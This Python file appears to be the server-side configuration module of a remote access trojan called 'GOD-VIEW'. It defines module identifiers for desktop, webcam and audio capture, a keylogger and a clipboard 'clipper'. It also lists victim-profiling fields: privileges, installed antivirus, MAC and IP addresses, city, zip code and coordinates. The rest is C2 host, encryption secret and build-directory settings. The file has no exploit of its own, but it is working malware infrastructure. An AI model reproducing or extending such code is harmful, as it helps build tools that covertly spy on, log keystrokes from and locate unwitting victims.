'''
    Server sided global state, variables for
    cross-file communication & accessability.
    Handles the argument parser along with
    other initial variables for the program
    to run.

    Verified: 2021 February 4 & 2021 February 8
    * Follows PEP8
    * Tested platforms
        * Windows 10

    CONSTANT : Settings dependence for
    HTTP, ACTION, CONSOLE & TRACEBACK.

    CONSTANT : GUI_PAGE is dependant
    on the filename of the GUI.
'''

from shared.state import Static

import argparse
import os


class ServerStatic:

    NAME          = 'GOD-VIEW'
    ARG_SEPARATOR = '--'
    SEPERATOR     = '->'
    LOADING       = 'Loading...'
    LOADING_AMID  = '...'

    WEB_GUI       = False
    TERMINAL      = False
    GUI_PORT      = 8565

    WINDOW_SIZE   = (1280, 720)
    TOKEN_TIMEOUT = 15
    PING_INTERVAL = 10
    UUID_LENGTH   = 4

    UNIVERSAL     = []
    SESSION       = []
    HELP          = []

    HTTP          = 'HTTP_LOG'
    ACTION        = 'ACTION_LOG'
    CONSOLE       = 'CONSOLE_LOG'
    TRACEBACK     = 'TRACEBACK_LOG'

    HOST          = f'tcp://{Static.IP}:{Static.PORT}'

    DESKTOP      = 'bb99d70e-aabe-4d5c-81cb-977dc0002d15'
    WEBCAM       = 'ea1331e2-8b5f-4e5b-b968-08b4ef953933'
    AUDIO        = '472371e9-72af-41f2-a099-d7111364c08c'
    KEYLOGGER    = 'e0f11b43-788b-4808-9005-48ebc4d53508'
    CLIPPER      = 'ee78cef3-adf5-42c2-a426-140cff586c1b'

    CATEGORIES  = (('Country', 'country'),
                   ('Connect IP', 'connect_ip'),
                   ('Username', 'username'),
                   ('Hostname', 'hostname'),
                   ('Privileges', 'privileges'),
                   ('Antivirus', 'antivirus'),
                   ('Operating System', 'operating_system'),
                   ('CPU', 'cpu'),
                   ('GPU', 'gpu'),
                   ('RAM', 'ram'),
                   ('Filepath', 'filepath'),
                   ('Initial Connect', 'initial_connect'),
                   ('Running', 'running'),
                   ('Build Name', 'build_name'),
                   ('Build Version', 'build_version'),
                   ('OS Version', 'os_version'),
                   ('System Locale', 'system_locale'),
                   ('System Uptime', 'system_uptime'),
                   ('PC Manufacturer', 'pc_manufacturer'),
                   ('PC Model', 'pc_model'),
                   ('MAC Address', 'mac_address'),
                   ('External IP', 'external_ip'),
                   ('Local IP', 'local_ip'),
                   ('Timezone', 'timezone'),
                   ('Country Code', 'country_code'),
                   ('Region', 'region'),
                   ('~City', 'city'),
                   ('~Zip Code', 'zip_code'),
                   ('~Latitude', 'latitude'),
                   ('~Longitude', 'longitude'))

    @classmethod
    def setup(cls):
        for key, value in Args().dict.items():
            if hasattr(Static, key):
                setattr(Static, key, value)
            else:
                setattr(cls, key, value)

        if not cls.TERMINAL:
            cls.GUI_HELP = {}
            cls.GUI_PAGE = 'index.html'
            cls.GUI_HOST = f'http://{Static.IP}:{cls.GUI_PORT}'
            cls.GUI_DIR = os.path.join(Static.ROOT_DIR, 'gui')

        cls.BUILD_DIR = os.path.join(Static.ROOT_DIR, 'exe')
        cls.ARCHIVE_DIR = os.path.join(Static.ROOT_DIR, 'archive')
        cls.LOGS_DIR = os.path.join(cls.ARCHIVE_DIR, 'history')


class Dynamic:

    RESULT   = None
    MESSAGES = []
    CLIENTS  = {}
    SESSION  = set()
    TOKENS   = {}
    MODULES  = {}


class Args:

    __ARG_PREFIX = '-'
    __ARGS = (
        ('IP', {
            'help': f'Host IP ({Static.IP})',
            'default': Static.IP
        }),
        ('PORT', {
            'help': f'Host Port ({Static.PORT})',
            'type': int,
            'default': Static.PORT
        }),
        ('GUI_PORT', {
            'help': f'Desktop & Web GUI Host Port ({ServerStatic.GUI_PORT})',
            'type': int,
            'default': ServerStatic.GUI_PORT
        }),
        (
            ('WEB_GUI', {
                'help': f'Only Terminal & Web GUI ({ServerStatic.WEB_GUI})',
                'action': 'store_true'
            }),
            ('TERMINAL', {
                'help': f'Only Terminal ({ServerStatic.TERMINAL})',
                'action': 'store_true'
            })
        ),
        ('SECRET', {
            'help': f'Encryption Secret ({Static.SECRET})',
            'default': Static.SECRET
        }),
        ('SALT', {
            'help': f'Encryption Salt ({Static.SALT})',
            'default': Static.SALT
        }))

    def __init__(self):
        parser = argparse.ArgumentParser()

        for item in Args.__ARGS:
            if type(item[0]) is tuple:
                group = parser.add_mutually_exclusive_group()

                for key, value in item:
                    group.add_argument(Args.__ARG_PREFIX + key, **value)
            else:
                parser.add_argument(Args.__ARG_PREFIX + item[0], **item[1])

        self.__dict = vars(parser.parse_args())

    @property
    def dict(self):
        return self.__dict
